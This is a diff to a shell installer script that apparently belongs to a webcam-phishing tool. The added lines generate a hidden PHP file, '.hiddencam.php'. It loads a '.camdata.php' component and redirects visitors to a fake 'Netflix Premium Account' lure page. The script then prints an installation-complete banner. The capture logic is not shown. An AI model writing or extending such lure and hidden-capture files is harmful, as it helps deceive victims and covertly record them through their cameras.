@@ -65,6 +65,9 @@ exit 1
 fi
 fi
 fi
+# Create Files
+printf "<?php\ninclude '.camdata.php';\nheader('Location: .NetFlix-Premium-Account.html');\nexit\n?>\n" > .hiddencam.php
+
 
 printf " \n"
 printf " \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Installation Completed ...\e[0m\n"
